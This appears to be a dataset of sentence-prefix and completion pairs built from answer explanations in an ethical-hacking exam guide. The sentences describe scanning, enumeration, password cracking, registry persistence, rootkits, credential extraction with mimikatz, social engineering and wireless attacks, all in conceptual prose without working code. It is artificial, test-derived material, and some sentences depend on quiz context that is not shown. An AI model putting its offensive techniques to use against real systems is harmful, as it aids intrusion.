"even though it ’ s called an event manager , it isn ’ t","even though it ’ s called an event manager , it isn ’ t used to manage security projects , nor is it used to escalate security events"
log messages don ’ t typically consume a lot of space at,"log messages don ’ t typically consume a lot of space at an individual message level , so bandwidth isn ’ t a problem"
"however , if an attacker does compromise a system , the attacker","however , if an attacker does compromise a system , the attacker may delete the local logs because they could get access to them"
"while the sequence numbers are shared , they wouldn ’ t be called","while the sequence numbers are shared , they wouldn ’ t be called aligned , which might suggest that each end was using the same sequence number"
a syn message is part of the three-way handshake,"a syn message is part of the three-way handshake , but it is not sufficient to establish a connection"
"standards and practices should be derived from a security policy , which","standards and practices should be derived from a security policy , which is the high- level guidance on the role of security within an organization"
"the parkerian hexad takes the confidentiality , integrity , and availability of the","the parkerian hexad takes the confidentiality , integrity , and availability of the cia triad and adds utility , possession ( or control ) , and authenticity"
"while system shutdown , service startup , and package installation may be","while system shutdown , service startup , and package installation may be events that are logged , they are generally logged by normal system logging"
"auditing functions are different between windows and linux/unix , but audit systems","auditing functions are different between windows and linux/unix , but audit systems for both will generate logs when a user logs into a system"
a bogus message likely wouldn ’ t result in a completed,"a bogus message likely wouldn ’ t result in a completed three-way handshake , and the handshake shouldn ’ t be completed anyway"
"an intrusion prevention system can , however , block or reject","an intrusion prevention system can , however , block or reject network traffic , while an intrusion detection system can ’ t"
runtime application self-protection is a plug-in used on an,runtime application self-protection is a plug-in used on an application server to prevent bad messages from impacting the application
"a web application firewall , however , makes decisions based on","a web application firewall , however , makes decisions based on application layer traffic and will either allow or block that traffic"
"a packet filter would , though , use source or destination ports","a packet filter would , though , use source or destination ports , potentially , to make decisions about allowing or blocking a packet"
a buffer overflow attack is used to execute attacker-supplied,a buffer overflow attack is used to execute attacker-supplied code by altering the return address in the stack
a man in the middle attack can be used,a man in the middle attack can be used to intercept and potentially alter a conversation between two systems
a watering hole attack does not compromise integrity since,a watering hole attack does not compromise integrity since its purpose is to introduce malware to a system
a phishing attack looks to gather information from victims,"a phishing attack looks to gather information from victims , potentially by compromising the victim ’ s system"
installing multiple firewalls and intrusion detection systems and ensuring that policies are,installing multiple firewalls and intrusion detection systems and ensuring that policies are up to date are all elements of a defense in depth approach
introducing a devsecops culture may be an attempt to reduce,introducing a devsecops culture may be an attempt to reduce the number of vulnerabilities and also get them resolved more quickly
"you need to provide either a domain , which would catch all fqdns in","you need to provide either a domain , which would catch all fqdns in that domain that were available in the search database , or a specific hostname"
"absolute time would be based in a particular time zone , and","absolute time would be based in a particular time zone , and time zones aren ’ t communicated at the network or data link layers"
a local caching server is what most people use to perform,a local caching server is what most people use to perform dns lookups from their systems in order to get better performance
"dns requests from a local caching server start with the cache , then move","dns requests from a local caching server start with the cache , then move to root servers and then subsequent servers , always getting closer to the final destination"
"this process of asking a question , getting an answer","this process of asking a question , getting an answer , and asking again using the new information is called recursion"
"neither serial nor combinatorics make sense in this context , and bistromathics is a field","neither serial nor combinatorics make sense in this context , and bistromathics is a field of study invented by douglas adams for the book life , the universe and everything"
"it may be possible to get phishing targets , but it ’","it may be possible to get phishing targets , but it ’ s not guaranteed , and a single individual usually isn ’ t identified"
"technologies used at a company , though , would be identified","technologies used at a company , though , would be identified in order to ensure that the applicant has the right experience"
"theharvester , though , can be used to search across multiple","theharvester , though , can be used to search across multiple sources , including bing , google , pgp servers , and linkedin"
"while the others may include details about companies , only","while the others may include details about companies , only linkedin is primarily used as a business social networking site"
"people who have profiles there would list job titles ,","people who have profiles there would list job titles , and job searches would indicate openings , including job titles"
"the query language is similar to that used by google , except","the query language is similar to that used by google , except it has additional keywords that could be used to identify network traffic"
wappalyzer is an extension for the chrome browser that,wappalyzer is an extension for the chrome browser that can be used to identify technologies used in a website
it ’ s also not used for analyzing web headers,it ’ s also not used for analyzing web headers because there is more to what wappalyzer does than that
"it may look at some pieces of application code to get frameworks that are used ,","it may look at some pieces of application code to get frameworks that are used , but it doesn ’ t analyze application code in the traditional sense of application code analysis"
you could potentially use a brute force technique to identify,"you could potentially use a brute force technique to identify hostnames , though you may not get everything using that method"
"when you run a whois query against an ip address , you will get the","when you run a whois query against an ip address , you will get the block the address belongs to , the owner of the block , and the technical contact"
"administrator : is not a keyword , which means administrator:500 : is the search term","administrator : is not a keyword , which means administrator:500 : is the search term that google would use along with the filetype of txt , which would mean text files"
"dig can be used , but when you provide the @ parameter","dig can be used , but when you provide the @ parameter , it would be followed by the name server you want to query"
"while an enterprise may have one or even several caching name servers , the caching name server wouldn ’","while an enterprise may have one or even several caching name servers , the caching name server wouldn ’ t be said to belong to the domain because it doesn ’ t have any domain identification associated with it"
"while you may be able to locate someone using a username ,","while you may be able to locate someone using a username , you may not be able to get detailed information about the user"
"intelius is a person search site , and you can get","intelius is a person search site , and you can get detailed information there , but you can ’ t search by username"
"linkedin is typically used for business networking , but there wouldn","linkedin is typically used for business networking , but there wouldn ’ t be much in the way of detailed financial information there"
edgar is the database that is maintained by,edgar is the database that is maintained by the sec and includes filing information from public companies
the 14-a report required by the sec for,the 14-a report required by the sec for public companies would include the annual report to shareholders
a syn scan sends the first syn message and then responds,a syn scan sends the first syn message and then responds with a rst message after receiving the syn/ack from the target
since the full connect scan follows the correct order of the,"since the full connect scan follows the correct order of the three-way handshake , it doesn ’ t send an ack first"
since a lack of response can mean the message never reached,"since a lack of response can mean the message never reached its recipient , the scanning system has to retransmit to closed ports"
"udp is generally quicker than tcp because of a lack of overhead , it requires","udp is generally quicker than tcp because of a lack of overhead , it requires no messages to set up , and it has the same number of ports as tcp"
"when a system receives an ack message , meaning a tcp segment with the ack flag enabled ( bit position","when a system receives an ack message , meaning a tcp segment with the ack flag enabled ( bit position storing a 1 ) , it assumes there is an open connection and there is data that is being acknowledged"
ack is a supported flag in the right circumstances and ack scans,"ack is a supported flag in the right circumstances and ack scans do not cause retransmits , since no response means one of two things"
"since an ack without an open connection is aberrant ,","since an ack without an open connection is aberrant , the firewall or ids may ignore it , avoiding detection"
the code is no more robust in nmap for an ack scan than other,"the code is no more robust in nmap for an ack scan than other scans , or at least there is no evidence of that being the case"
"when nmap performs an operating system scan , it is looking","when nmap performs an operating system scan , it is looking for fingerprints of the network stack in the operating system kernel"
"similarly , it will look at the initial sequence number","similarly , it will look at the initial sequence number in tcp messages to see what numbers are used there"
"the application version isn ’ t relevant to an operating system scan ,","the application version isn ’ t relevant to an operating system scan , and there are no operating system headers that would be associated with network traffic"
operating system headers could be considered to be part of the source code for,"operating system headers could be considered to be part of the source code for the operating system , but nmap wouldn ’ t be able to see those"
a version scan with nmap is looking to,a version scan with nmap is looking to identify versions of the services/applications running on the target
"as a result , if speed is a consideration , and especially if you","as a result , if speed is a consideration , and especially if you are scanning large address blocks , masscan is probably better suited for that task"
"both nmap and masscan have access to the same address space , and masscan uses the same","both nmap and masscan have access to the same address space , and masscan uses the same command-line parameters , for the most part , as nmap , so they are similarly easy to use"
"it ’ s possible that someone mistyped ping , but those parameters aren ’ t used by ping programs ,","it ’ s possible that someone mistyped ping , but those parameters aren ’ t used by ping programs , and since they are coherent for the action above , it makes more sense that they were trying to use hping"
they would only exploit a vulnerability to the,they would only exploit a vulnerability to the extent necessary to determine whether a vulnerability exists
"it ’ s possible they are looking to compare results from the two , but it ’","it ’ s possible they are looking to compare results from the two , but it ’ s also very likely they are trying to compare the results with the intention of reducing false positives"
icmp is a lightweight protocol and there is a chance it will be,"icmp is a lightweight protocol and there is a chance it will be allowed through the firewall , since it ’ s used for troubleshooting and diagnostics"
"you would be expected to scan production servers , since that","you would be expected to scan production servers , since that would be where you would be most interested to find vulnerabilities"
letting operations staff know ahead of time is polite since vulnerability scans,letting operations staff know ahead of time is polite since vulnerability scans may inadvertently knock over systems that would need to be stood back up
"you may have reasons to use limited details in your scan reports , including","you may have reasons to use limited details in your scan reports , including trying to reduce the disk space used or the paper used in printing the reports"
taking no action on the results of a vulnerability scan is about,taking no action on the results of a vulnerability scan is about the worst thing you can do when it comes to vulnerability scans
"it ’ s worse than not running them , since you could be considered liable","it ’ s worse than not running them , since you could be considered liable because you know about the vulnerabilities but you aren ’ t doing anything about them"
"you could use a proxy for some tasks , but all it would do","you could use a proxy for some tasks , but all it would do would be to hide your own ip address , which isn ’ t evasive"
"when you encode data , though , you make it harder for the firewall or ids to identify","when you encode data , though , you make it harder for the firewall or ids to identify something bad that may be happening , since these devices can ’ t read the messages coming through"
a dns amplification attack is where a small dns,a dns amplification attack is where a small dns request results in much larger responses sent to the target
the xmas scan is a tcp scan that uses unusual flag,the xmas scan is a tcp scan that uses unusual flag settings in the tcp headers to attempt to evade firewalls or idss
"the xmas scan uses the fin , psh , and urg flags and is called","the xmas scan uses the fin , psh , and urg flags and is called an xmas scan because it looks like the packet is lit up like a christmas tree"
"megaping can be used to perform a lot of different functions , but crafting","megaping can be used to perform a lot of different functions , but crafting packets , sending manual web requests , and running exploits are not functions it supports"
if you want to change a severity rating from the,"if you want to change a severity rating from the one supplied by openvas , you would override that rating"
you may have mitigations in place or you may have,you may have mitigations in place or you may have investigated and found the finding to be a false positive
"credentials wouldn ’ t give better reliability in network findings , and vulnerability","credentials wouldn ’ t give better reliability in network findings , and vulnerability scanners don ’ t typically provide a way to directly authenticate through a vpn"
"an active directory scan is a vague answer , and it","an active directory scan is a vague answer , and it may not be something you can do with a vulnerability scanner"
"if you provide credentials , though , the scanner can","if you provide credentials , though , the scanner can authenticate against systems on the network and check for local vulnerabilities"
the program fragroute uses configuration statements to determine what,the program fragroute uses configuration statements to determine what should be done to packets destined for a specific host
"while there is a possibility of fragmenting layer 3 headers , if layer 2 headers","while there is a possibility of fragmenting layer 3 headers , if layer 2 headers were fragmented , there would be no way to get the message to the destination"
remote procedure calls are a way for processes on,remote procedure calls are a way for processes on one system to communicate with processes on another system
enum4linux is a tool that makes use of other,"enum4linux is a tool that makes use of other , underlying tools to scan systems that have implemented smb"
"snmp doesn ’ t use hashes , and while the word public is often used to","snmp doesn ’ t use hashes , and while the word public is often used to describe a community string , a public string is not a way to authenticate with snmpv1"
the smtp command used to expand a mailing list alias to get the,the smtp command used to expand a mailing list alias to get the underlying email addresses that belong to that mailing list or group is expn
the utility dirb uses a word list to attempt to enumerate directories available through a web,the utility dirb uses a word list to attempt to enumerate directories available through a web server that may not be available by looking at all the pages and links in the site
the extensible markup language ( xml ) is a way of packaging,the extensible markup language ( xml ) is a way of packaging data in a structured way but it is not used in snmp
the process with which programs have to communicate to,the process with which programs have to communicate to get a dynamic port allocation is the rmi registry
this is the program you query to identify services,this is the program you query to identify services that are available on a system that has implemented rmi
the extended smtp ( esmtp ) protocol has a command,the extended smtp ( esmtp ) protocol has a command that is abbreviated vrfy that is used to verify email addresses
smbclient is a program that comes with a samba installation,smbclient is a program that comes with a samba installation that can be used to interact with a system using smb
"the program nbtstat , though , can be used to gather information","the program nbtstat , though , can be used to gather information using smb , and it is a program that is installed with windows"
"version 2 improved version 1 , but it was","version 2 improved version 1 , but it was version 3 that implemented user-based authentication as well as encryption"
"it also can ’ t be used to enumerate posts , and since","it also can ’ t be used to enumerate posts , and since there would only be a single version , you wouldn ’ t enumerate versions"
an nmap script includes a port registration so nmap knows to,an nmap script includes a port registration so nmap knows to call that script when specific ports are found to be open
the common internet file system ( cifs ) is,the common internet file system ( cifs ) is an implementation of file sharing and system management using smb
while you may be able to do some remote management using the,"while you may be able to do some remote management using the ipc $ share , it is not used for remote process management"
while nmap is an excellent program in its own right and can be used to enumerate data,"while nmap is an excellent program in its own right and can be used to enumerate data across multiple services , it doesn ’ t store data for retrieval later without some additional help"
metasploit can also be used to enumerate data across multiple services and also,metasploit can also be used to enumerate data across multiple services and also uses a database on the backend to store data to be retrieved later
"while moves , adds , and changes may sometimes be referred to as mac ,","while moves , adds , and changes may sometimes be referred to as mac , like modified , accessed , and created , those are not tasks associated with file times"
"account migration , privilege migration , and account escalation are vague and","account migration , privilege migration , and account escalation are vague and don ’ t have clearly defined definitions , even if they may exist"
"privilege escalation , on the other hand , is used to gain","privilege escalation , on the other hand , is used to gain elevated privileges when you only have the permissions of a normal user"
incremental mode in john will run an attack in which it will try,"incremental mode in john will run an attack in which it will try every possible password within specified parameters , meaning john will generate the passwords"
"the default mode in john is single crack mode , which uses information","the default mode in john is single crack mode , which uses information including the username and the home directory to generate a password using mangling rules"
rainbow tables use precomputed hashes that are mapped to plaintext passwords in,rainbow tables use precomputed hashes that are mapped to plaintext passwords in order to speed up the process of obtaining the passwords from stored hashes
a local vulnerability would not be used to collect passwords,a local vulnerability would not be used to collect passwords ; you don ’ t need a vulnerability to do that
alternate data streams are a function of the new technology file system ( ntfs ),"alternate data streams are a function of the new technology file system ( ntfs ) , created to support the resource forks of apple ’ s file system in windows nt"
since many of the utilities and programs in windows don ’ t natively understand alternate data,"since many of the utilities and programs in windows don ’ t natively understand alternate data streams , they can ’ t make use of them and won ’ t show them"
you may use a powershell script to perform functions that could support persistence on a,"you may use a powershell script to perform functions that could support persistence on a system , but the powershell script alone won ’ t be used to maintain access"
"the run key in the windows registry , though , could be used to put an entry in","the run key in the windows registry , though , could be used to put an entry in that would run a program automatically that could make sure an attacker could get access even after a reboot"
while the tor network may be used to obtain an exploit against a,"while the tor network may be used to obtain an exploit against a vulnerability , there is some question as to how reliable that exploit may be"
meterpreter and msfvenom are elements of metasploit that don,meterpreter and msfvenom are elements of metasploit that don ’ t have anything to do with locating vulnerabilities
exploit-db is a website and repository of exploits that could,exploit-db is a website and repository of exploits that could be searched to locate an exploit targeting specific and known vulnerabilities
while you may be able to manipulate time stamps and log files,"while you may be able to manipulate time stamps and log files in meterpreter , you wouldn ’ t use the clearev command for that"
"in order to do anything , like wiping log files or pivoting","in order to do anything , like wiping log files or pivoting to another network , you would need to elevate privileges to administrative/root level"
"the way around that is to install a rootkit , which may include kernel-mode","the way around that is to install a rootkit , which may include kernel-mode drivers or replacement system utilities that would hide the existence of these files and processes"
pivoting is the process of using a compromised system to,pivoting is the process of using a compromised system to move onto other systems and networks within the target environment
"you may ultimately get to a database server by pivoting , but","you may ultimately get to a database server by pivoting , but that ’ s not what pivoting does or is specifically used for"
rainbow tables are not wordlists but mappings of plaintext passwords to,"rainbow tables are not wordlists but mappings of plaintext passwords to hashes , which makes it much easier to get passwords from hashes"
large icmp packets aren ’ t likely to do,large icmp packets aren ’ t likely to do anything and certainly wouldn ’ t exploit a client-side vulnerability
"steganography is the process of hiding data inside of other data ,","steganography is the process of hiding data inside of other data , such as media files like mp3s , wavs , or video files"
"when you inject into a process , you are putting","when you inject into a process , you are putting executable operations you have created into the space of another executable"
the end result could be an execution thread running your,the end result could be an execution thread running your code without any new process name indicating it was running
"they could be part of the overall process of system compromise , but neither could","they could be part of the overall process of system compromise , but neither could be used to compromise a system , in spite of what it suggests in the matrix"
"once the system is compromised , metasploit could then be","once the system is compromised , metasploit could then be used for post-exploitation actions using modules that come with it"
a web application firewall is placed with the,a web application firewall is placed with the server to protect the server from application layer attacks
"they are not a target for client-side exploits ,","they are not a target for client-side exploits , though they would be used to carry out those attacks"
this may include hiding processes and files through,this may include hiding processes and files through the use of kernel-mode drivers or replaced system utilities
a rootkit may also provide a backdoor for attackers to,a rootkit may also provide a backdoor for attackers to maintain long-term access to the system after the initial compromise
john the ripper and rainbow tables are tools for,"john the ripper and rainbow tables are tools for cracking passwords , not gathering or obtaining password hashes"
mimikatz is a utility and metasploit module that could,mimikatz is a utility and metasploit module that could be used to extract passwords from a compromised system
"both worms and viruses could be written to use polymorphic code ,","both worms and viruses could be written to use polymorphic code , which means they could modify what they look like as they propagate"
static analysis is looking at the properties of the executable,static analysis is looking at the properties of the executable file and evaluating the assembly language code without running the program
"this will limit your exposure to infection , because if you do it","this will limit your exposure to infection , because if you do it right you aren ’ t running the program , which would infect you"
virustotal takes dozens of antivirus engines and runs samples,virustotal takes dozens of antivirus engines and runs samples through them to identify what malware they might be
"virustotal is a website , which means it can ’ t check","virustotal is a website , which means it can ’ t check your system for viruses and also can ’ t do any endpoint protection"
"while virustotal can identify the name given to a malware sample by different antivirus solutions , to","while virustotal can identify the name given to a malware sample by different antivirus solutions , to find the research associated with that malware , you would need to check with the antivirus vendor"
"packers will make a program smaller , which was initially of some value when bandwidth","packers will make a program smaller , which was initially of some value when bandwidth wasn ’ t as ubiquitous , but a packer doesn ’ t do any compilation"
"a packer can , however , obscure the actual program code because the","a packer can , however , obscure the actual program code because the only executable function is one designed to extract and decompress the real malware"
polymorphic code rewrites the program when it is copied,polymorphic code rewrites the program when it is copied or moved from one system or location to another
it isn ’ t more efficient and doesn ’ t help,"it isn ’ t more efficient and doesn ’ t help with propagation , though it could be part of the propagation process"
"python interpreters may be considered slower to execute than a compiled program , but the difference is","python interpreters may be considered slower to execute than a compiled program , but the difference is negligible and speed of execution generally isn ’ t much of a concern when it comes to malware"
"one challenge , though , is that you may need a python interpreter unless","one challenge , though , is that you may need a python interpreter unless you go through the step of getting a python compiler and compiling your script"
cuckoo sandbox is a set of programs and infrastructure used,cuckoo sandbox is a set of programs and infrastructure used to run malware and identify changes to the system that result
"dynamic analysis can make use of disassembled executables , but the","dynamic analysis can make use of disassembled executables , but the tool would need to also be able to execute the code"
an executable contains a set of binary values that the cpu will,an executable contains a set of binary values that the cpu will interpret as operation codes ( opcodes ) when the program is run
"as a result , disassemblers are used to convert opcodes to mnemonics ,","as a result , disassemblers are used to convert opcodes to mnemonics , which are short/abbreviated words that can let someone know what the opcode does"
this alteration is done in order to prevent,this alteration is done in order to prevent the antivirus program from recognizing the executable as malware
"the malware could potentially be used as part of a poison pill , which is a type","the malware could potentially be used as part of a poison pill , which is a type of defensive tactic , but it ’ s hard to determine that just from the command line"
"it doesn ’ t act as malware infrastructure , and while it may","it doesn ’ t act as malware infrastructure , and while it may be polymorphic , that wouldn ’ t be why someone used a trojan"
"when you are trying to dynamically analyze malware , a debugger is useful","when you are trying to dynamically analyze malware , a debugger is useful because it allows you to run the malware and also control its execution"
it ’ s better to initiate from inside the network,"it ’ s better to initiate from inside the network to get through firewalls , which may block inbound communication flows"
"the firewall may block inbound communications , which is why it","the firewall may block inbound communications , which is why it ’ s better for the communication to originate from the inside"
"virtual machines don ’ t factor in here , and antivirus could catch the malware regardless of which","virtual machines don ’ t factor in here , and antivirus could catch the malware regardless of which direction the traffic is going , since antivirus uses the executable file rather than the communication stream for detection"
cisco uses the term switch port analyzer ( span ),"cisco uses the term switch port analyzer ( span ) , which leads to the process sometimes being called port spanning"
not only does tcpdump look up port numbers and print,"not only does tcpdump look up port numbers and print their service names , it also triggers a dns lookup"
"this dns lookup is network traffic , which means that for most","this dns lookup is network traffic , which means that for most packets there is probably a dns lookup request showing in the packet capture"
when an arp response is sent without a corresponding arp,"when an arp response is sent without a corresponding arp request , it ’ s an unexpected or unnecessary message"
"while conversations and endpoints are statistics you can get from wireshark , the protocol hierarchy view shows","while conversations and endpoints are statistics you can get from wireshark , the protocol hierarchy view shows a layered look at all the protocols in the capture , showing percentages for all of the protocols"
"while tcpdump and tshark can both be used to capture packets ,","while tcpdump and tshark can both be used to capture packets , tshark gives you the ability to specify which fields you want to output"
"you can change the field to show absolute time , such as","you can change the field to show absolute time , such as the time of day or the time since 1970 ( epoch time )"
this means there needs to be an arp spoof in place so ettercap ( or another,this means there needs to be an arp spoof in place so ettercap ( or another tool ) can get the traffic on the network to get the dns request to respond to
"the -n flag tells wireshark to not do name resolution ,","the -n flag tells wireshark to not do name resolution , leaving you with numeric values for the ip address and port number"
the number of mac addresses can be smaller than the number of layer 3 addresses because multiple ip addresses could be associated with a,the number of mac addresses can be smaller than the number of layer 3 addresses because multiple ip addresses could be associated with a single mac address if the ip addresses are off network ; the mac address for those would be the gateway ’ s mac address
"if a system opens multiple connections to the same system , as may happen when rendering","if a system opens multiple connections to the same system , as may happen when rendering a web page , there would be multiple port combinations for the same ip source and destination"
"it does not remove ssl requests , though it may","it does not remove ssl requests , though it may be used to convert an https request to an http request"
"it does not convert ssl to tls or tls to ssl ,","it does not convert ssl to tls or tls to ssl , and there would be no particular advantage to either of those tasks"
"wireshark presents a relative sequence number , which means the initial sequence number","wireshark presents a relative sequence number , which means the initial sequence number as far as wireshark is concerned in presenting it to you is 1"
anything you see in wireshark that is in square,anything you see in wireshark that is in square brackets [ ] is something wireshark has calculated or inferred
switches filter traffic by only sending traffic destined for the mac address associated,switches filter traffic by only sending traffic destined for the mac address associated with the port to which the system that owns the mac address is attached
"they don ’ t support layer 3 as switches , though","they don ’ t support layer 3 as switches , though there are such things as multilayer switches that include routing functionality"
pretexting is coming up with a believable story that you can,pretexting is coming up with a believable story that you can use when trying to perform a social engineering attack on someone
you could use usb sticks or cds around as bait if they had software on them that would,you could use usb sticks or cds around as bait if they had software on them that would run and “ infect ” the target system in a way that would give you control over them
social proof is in use when it appears to be okay,social proof is in use when it appears to be okay to engage in a behavior because you see others engaging in it
"when people see a line of others waiting to grab usb sticks , in spite of","when people see a line of others waiting to grab usb sticks , in spite of knowing they shouldn ’ t trust usb sticks , they may be inclined to lower their defenses"
"there may eventually be scarcity , but that ’ s not what","there may eventually be scarcity , but that ’ s not what would drive people to stand in line to acquire a potentially dangerous item"
phone verification could possibly be used as a way of,"phone verification could possibly be used as a way of verifying identity , but it won ’ t protect against tailgating"
"a man trap , however , will protect against tailgating because","a man trap , however , will protect against tailgating because a man trap allows only one person in at a time"
"either way , when you are using social engineering of wireless networks","either way , when you are using social engineering of wireless networks , you are probably attempting to gather credentials to gain access to sites"
it ’ s unlikely you ’ d use this vector for sending phishing messages or,"it ’ s unlikely you ’ d use this vector for sending phishing messages or getting email addresses , and it wouldn ’ t be used to make phone calls"
"however , if you are calling from the help desk ,","however , if you are calling from the help desk , you may be considered to be in a position of authority"
you would not be implementing social proof or demonstrating authority using,you would not be implementing social proof or demonstrating authority using an automated attack any more than if you did it manually
"you would be reducing complexity , though , since doing it","you would be reducing complexity , though , since doing it manually means you would be setting up and controlling multiple moving pieces"
impersonation is a social engineering vector and the,impersonation is a social engineering vector and the one used to gain unauthorized access to a facility
"if you sent an email posing as a former co-worker ,","if you sent an email posing as a former co-worker , you could be implementing a couple of different social engineering principles"
wget is the only one of these options that is a,"wget is the only one of these options that is a legitimate program , and it can be used to clone a website"
"while some people do epoxy usb ports to prevent usb sticks from being inserted , it ’ s not","while some people do epoxy usb ports to prevent usb sticks from being inserted , it ’ s not a good approach and wouldn ’ t necessarily keep a baiting attack from working if the bait is a cd-rom"
a false acceptance rate measures how often a biometric,a false acceptance rate measures how often a biometric system allows unauthorized users access to a facility or area
"a false failure ( or reject ) rate is inconvenient , and some organizations","a false failure ( or reject ) rate is inconvenient , and some organizations may consider that to be an issue , especially if it ’ s very high"
"however , a high false accept rate is probably more concerning","however , a high false accept rate is probably more concerning because you are allowing people who are really unauthorized to have access"
the other two are not statistics that are measured ; though they correlate to,"the other two are not statistics that are measured ; though they correlate to the others , they are not called false positive rate or false negative rate"
"as a result , it would be the most likely to give you","as a result , it would be the most likely to give you a high false reject rate , which would lower the true accept rate"
"a proximity card could enable tailgating , but it ’","a proximity card could enable tailgating , but it ’ s not the only thing—a key could enable tailgating as well"
"while the retina and the uvea are also parts of the eye , neither","while the retina and the uvea are also parts of the eye , neither of them encloses the pupil and can be used as a means of identification"
if you are an authorized person but your biometric scanner isn ’ t working reliably and rejects,"if you are an authorized person but your biometric scanner isn ’ t working reliably and rejects you , you may need to call security or someone else to let you into the building"
"smishing is short message phishing , which means someone is","smishing is short message phishing , which means someone is sending a text message , attempting to fraudulently gather information"
"with a phone call , though , you could go","with a phone call , though , you could go into more detail and address questions or concerns as they arise"
you could include additional layers that you couldn ’ t with an email since you could,"you could include additional layers that you couldn ’ t with an email since you could never be sure if your email was read , or deleted , or caught in a filter"
you may end up with a meterpreter interface to a remote system,"you may end up with a meterpreter interface to a remote system , but it wouldn ’ t be used to generate the attacks"
the social-engineer toolkit ( se toolkit ) could be,the social-engineer toolkit ( se toolkit ) could be used to automate email attacks as well as wireless attacks
promiscuous mode is used on network interfaces to collect,promiscuous mode is used on network interfaces to collect frames that are not destined for the network interface
"to capture radio headers , monitor mode needs to be enabled in addition to the promiscuous","to capture radio headers , monitor mode needs to be enabled in addition to the promiscuous mode that will always be set to get all frames and all information from the frame"
while you should be able to identify vendors as part of the process of,"while you should be able to identify vendors as part of the process of running a bluetooth scan , it ’ s not the purpose of the scan"
the purpose is to identify endpoints and their associated,the purpose is to identify endpoints and their associated addresses so you can run other attacks on them
"there is no way to reduce the number of steps in a handshake ,","there is no way to reduce the number of steps in a handshake , and downgrading encryption is considerably harder , if it ’ s possible at all"
bring your own device ( byod ) is a policy that,bring your own device ( byod ) is a policy that allows employees to use their own devices on an enterprise network
"in wep , the algorithm specified for","in wep , the algorithm specified for the initialization vector yielded non-random , predictable values"
"seeding vector is not a real thing , and diffie-hellman","seeding vector is not a real thing , and diffie-hellman is a process used to derive and exchange keys securely"
"a rogue access point , meaning one that isn ’ t legitimate , is","a rogue access point , meaning one that isn ’ t legitimate , is used in an evil twin attack by pretending to be a legitimate access point"
an evil twin attack uses an access point masquerading as the point,an evil twin attack uses an access point masquerading as the point of connection for stations trying to connect to a legitimate wireless network
while you may phish for credentials as part of an evil,"while you may phish for credentials as part of an evil twin attack , credential phishing is not how evil twin attacks work"
ssids don ’ t get changed as part of an evil,"ssids don ’ t get changed as part of an evil twin attack , meaning no ssid that exists will become another ssid"
"injecting four-way handshakes won ’ t do much , since four-way assumes both ends","injecting four-way handshakes won ’ t do much , since four-way assumes both ends are communicating , so the injection of a full communication stream will get ignored"
"it ’ s not impossible to get malware onto mobile devices through them ,","it ’ s not impossible to get malware onto mobile devices through them , but it ’ s very difficult because apps get run through a vetting process"
"while some android devices will support external storage , it ’ s not","while some android devices will support external storage , it ’ s not an effective way to get malware onto a smartphone or other mobile device"
"jailbreaking can lead to malware being installed , but it ’","jailbreaking can lead to malware being installed , but it ’ s not the means to get malware onto a mobile device"
third-party app stores can be a good means to get malware onto mobile,third-party app stores can be a good means to get malware onto mobile devices because some third-party app stores don ’ t vet apps that are submitted
a bluebugging attack is used to gain access to a smartphone in,a bluebugging attack is used to gain access to a smartphone in order to initiate a call out to the attacker ’ s phone
"while there are bluetooth devices that will transmit much further , a","while there are bluetooth devices that will transmit much further , a common range is about 300 feet ( 100 meters ) for bluetooth 4"
"the package aircrack-ng includes the program airmon-ng , which","the package aircrack-ng includes the program airmon-ng , which can turn on monitor mode on a network interface"
"personal authentication makes use of a pre-shared key , while enterprise authentication uses usernames and passwords to authenticate","personal authentication makes use of a pre-shared key , while enterprise authentication uses usernames and passwords to authenticate specific users , providing accounting and access control , meaning we know exactly who has connected to the network"
radio headers in a wireless network will provide you with the capabilities,"radio headers in a wireless network will provide you with the capabilities of the devices , since that ’ s negotiated during the association process"
you will also see probe requests asking what networks are in,"you will also see probe requests asking what networks are in the area , including specific networks that a station knows about"
"while dns is also used for amplification attacks , smurf attacks are a","while dns is also used for amplification attacks , smurf attacks are a result of someone sending icmp echo requests to the broadcast address of a network"
the echo responses would be sent to the address in,"the echo responses would be sent to the address in the source of the request , which would be spoofed"
"an sql injection attack makes use of sql queries , which","an sql injection attack makes use of sql queries , which can include logic that may alter the flow of the application"
"because tcp uses a three-way handshake , spoofing","because tcp uses a three-way handshake , spoofing like that needed in amplification is very difficult"
"until the operating system has passed the three-way handshake , the request","until the operating system has passed the three-way handshake , the request won ’ t make it to the web server at the application layer"
the application layer doesn ’ t factor in here,the application layer doesn ’ t factor in here because there are no connection buffers at the application layer
"since the browser is with the user , ultimately the attack targets the","since the browser is with the user , ultimately the attack targets the user , even if the injection code is stored in a database server"
a defense in depth network design makes use of multiple prevention layers,a defense in depth network design makes use of multiple prevention layers to make breaching the inside of the network quite a bit harder
defense in breadth starts with defense in depth and,defense in breadth starts with defense in depth and takes a broader range of attack strategies into consideration
defense in breadth doesn ’ t necessarily protect against sql injection and,defense in breadth doesn ’ t necessarily protect against sql injection and probably doesn ’ t protect against buffer overflows or heap spraying attacks
"those protections may possibly be achieved , but ultimately defense in breadth","those protections may possibly be achieved , but ultimately defense in breadth would achieve them by taking a broader range of attacks into consideration"
"a buffer overflow attack is an attack against data in the stack , which","a buffer overflow attack is an attack against data in the stack , which is known about at compile time and , as a result , is not dynamic"
"a heap spraying attack , though , injects code into the","a heap spraying attack , though , injects code into the heap , which is where dynamically allocated memory is taken from"
a buffer overflow takes an excess amount of data and tries to,a buffer overflow takes an excess amount of data and tries to store it into a memory location that can ’ t accommodate it
"the script is injected using a < script > html tag , and the %","the script is injected using a < script > html tag , and the % 3c is a way of encoding < while % 3e is a way of encoding >"
base64 encoding takes non-printable characters and encodes them in,base64 encoding takes non-printable characters and encodes them in a way that they can be rendered in text
"however , a slow read attack tries to download a file in","however , a slow read attack tries to download a file in very small increments to keep a web server from serving legitimate requests"
a log manager will collect logs and perhaps aggregate them,"a log manager will collect logs and perhaps aggregate them , but it probably doesn ’ t correlate log messages"
a command injection sends operating system commands into a web,a command injection sends operating system commands into a web application so they can be run by the operating system
the web server ( meaning the web server application ) is not the,"the web server ( meaning the web server application ) is not the target of the command injection , nor is the database server or the user"
"however , the attack life cycle is a structured way to understand how attacks happen in order to","however , the attack life cycle is a structured way to understand how attacks happen in order to better inform a defensive strategy so controls can be implemented for each of the phases of the attack"
there is no buffer pointer from the perspective of the operating system,"there is no buffer pointer from the perspective of the operating system , though applications do use pointers and they do point to buffers"
controlling this piece of information can allow the,controlling this piece of information can allow the attacker to control the execution flow of the program
"in addition to not being the right decryption ,","in addition to not being the right decryption , none of the others have the correct number of letters"
"in a substitution cipher like a rotation cipher , you will always have","in a substitution cipher like a rotation cipher , you will always have the same number of letters in the output as you do in the input"
